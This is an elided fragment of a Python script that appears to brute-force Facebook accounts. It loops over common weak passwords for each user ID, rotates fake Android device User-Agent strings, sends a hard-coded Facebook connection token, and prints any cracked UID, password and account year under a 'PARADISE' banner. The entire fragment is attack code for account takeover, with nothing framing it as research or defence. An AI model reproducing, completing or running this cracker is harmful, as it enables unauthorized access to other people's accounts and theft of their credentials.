...
def login_1(uid):
    ...
    try:    
        for pw in ('123456', '1234567', '12345678', '123456789'):
            sys.stdout.write( 
                f"\r\r\r\x1b[38;5;220m🌟PARADISE🌟 "
                f"\x1b[38;5;45m({loop}) "
    ...
    "User-Agent": str(random.choice([
            ...
            f"{random.choice(['SM-A505F','SM-A307FN','SM-A125F','SM-J610F','Redmi Note 7','Redmi Note 8','CPH2269','V2027','V2030','Infinix X688B','SM-A125F','SM-A207F','SM-M326B','SM-A146P','SM-S918B','Redmi-Note-10','Redmi-Note-11','RMX3351','Vivo-1906','OPPO-CPH1909','Realme-RMX3085','TECNO-KG5k','Infinix-X657','Pixel-6','Pixel-7','Samsung-G991B','Samsung-G998B','Mi-11','OnePlus-9'])}) "
        ...
        "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
            ...
            if 'session_key' in res:
                ...
                print("\033[F\033[K", end="")
                print(f"\x1b[38;5;51m        ┃━𒁍 {w}UID       {w}: {g}{uid}{reset}")
                print(f"\x1b[38;5;51m        ┃    ━━𒁍{w}PASS  {w}: {g}{pw}{reset}")
                print(f"\x1b[38;5;51m        ┃    ━━𒁍{w}YEAR  {w}: {g}{creationyear(uid)}{reset}")
                print("\x1b[38;5;51m        ┃\x1b[0m")
